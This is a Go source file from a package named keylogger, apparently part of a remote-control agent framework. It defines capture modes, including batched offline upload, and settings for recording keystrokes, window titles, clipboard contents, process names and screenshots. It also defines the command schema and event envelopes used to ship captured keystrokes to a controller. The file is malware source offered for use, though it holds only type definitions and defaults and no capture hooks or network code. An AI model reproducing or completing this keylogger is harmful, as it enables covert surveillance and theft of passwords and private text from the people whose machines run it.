package keylogger

import (
	"context"
	"time"
)

// Mode represents the keylogger capture strategy requested by the controller.
type Mode string

const (
	// ModeStandard streams keystrokes as they are captured with a short cadence.
	ModeStandard Mode = "standard"
	// ModeOffline batches keystrokes locally and periodically uploads them.
	ModeOffline Mode = "offline"
)

// StartConfig contains runtime settings for the keylogger session.
type StartConfig struct {
	Mode               Mode `json:"mode"`
	CadenceMs          int  `json:"cadenceMs,omitempty"`
	BatchIntervalMs    int  `json:"batchIntervalMs,omitempty"`
	BufferSize         int  `json:"bufferSize,omitempty"`
	IncludeWindowTitle bool `json:"includeWindowTitles,omitempty"`
	IncludeClipboard   bool `json:"includeClipboard,omitempty"`
	EmitProcessNames   bool `json:"emitProcessNames,omitempty"`
	IncludeScreenshots bool `json:"includeScreenshots,omitempty"`
	EncryptAtRest      bool `json:"encryptAtRest,omitempty"`
	RedactSecrets      bool `json:"redactSecrets,omitempty"`
}

// normalize ensures sensible defaults for unset capture configuration values.
func (c StartConfig) normalize() StartConfig {
	normalized := c
	switch normalized.Mode {
	case ModeOffline:
		// keep as offline
	default:
		normalized.Mode = ModeStandard
	}
	if normalized.Mode == ModeStandard && normalized.CadenceMs <= 0 {
		normalized.CadenceMs = 250
	}
	if normalized.Mode == ModeOffline {
		if normalized.BatchIntervalMs <= 0 {
			normalized.BatchIntervalMs = int((15 * time.Minute).Milliseconds())
		}
		if normalized.BufferSize <= 0 {
			normalized.BufferSize = 5000
		}
	} else {
		if normalized.BufferSize <= 0 {
			normalized.BufferSize = 300
		}
	}
	if normalized.CadenceMs <= 0 {
		normalized.CadenceMs = 250
	}
	return normalized
}

// CommandPayload defines the schema shared between the controller and agent
// when controlling the keylogger module.
type CommandPayload struct {
	Action    string       `json:"action"`
	SessionID string       `json:"sessionId,omitempty"`
	Mode      Mode         `json:"mode,omitempty"`
	Config    *StartConfig `json:"config,omitempty"`
}

// CaptureEvent represents a keystroke event generated by the local platform
// specific hook.
type CaptureEvent struct {
	Timestamp     time.Time
	Key           string
	Text          string
	RawCode       string
	ScanCode      uint16
	Pressed       bool
	Alt           bool
	Ctrl          bool
	Shift         bool
	Meta          bool
	WindowTitle   string
	ProcessName   string
	ClipboardText string
}

// EventStream yields keylogger capture events until the session stops.
type EventStream interface {
	Events() <-chan CaptureEvent
	Close() error
}

// Provider represents a platform specific keystroke capture provider.
type Provider interface {
	Start(ctx context.Context, cfg StartConfig) (EventStream, error)
}

// Event describes the payload delivered back to the controller.
type Event struct {
	Sequence    uint64 `json:"sequence"`
	CapturedAt  string `json:"capturedAt"`
	Key         string `json:"key"`
	Text        string `json:"text,omitempty"`
	RawCode     string `json:"rawCode,omitempty"`
	ScanCode    uint16 `json:"scanCode,omitempty"`
	Pressed     bool   `json:"pressed,omitempty"`
	AltKey      bool   `json:"altKey,omitempty"`
	CtrlKey     bool   `json:"ctrlKey,omitempty"`
	ShiftKey    bool   `json:"shiftKey,omitempty"`
	MetaKey     bool   `json:"metaKey,omitempty"`
	WindowTitle string `json:"windowTitle,omitempty"`
	ProcessName string `json:"processName,omitempty"`
	Clipboard   string `json:"clipboard,omitempty"`
}

// EventEnvelope batches multiple keylogger events when transporting them to
// the controller.
type EventEnvelope struct {
	SessionID   string  `json:"sessionId"`
	Mode        Mode    `json:"mode"`
	CapturedAt  string  `json:"capturedAt"`
	Events      []Event `json:"events"`
	BatchID     string  `json:"batchId,omitempty"`
	TotalEvents uint64  `json:"totalEvents,omitempty"`
}
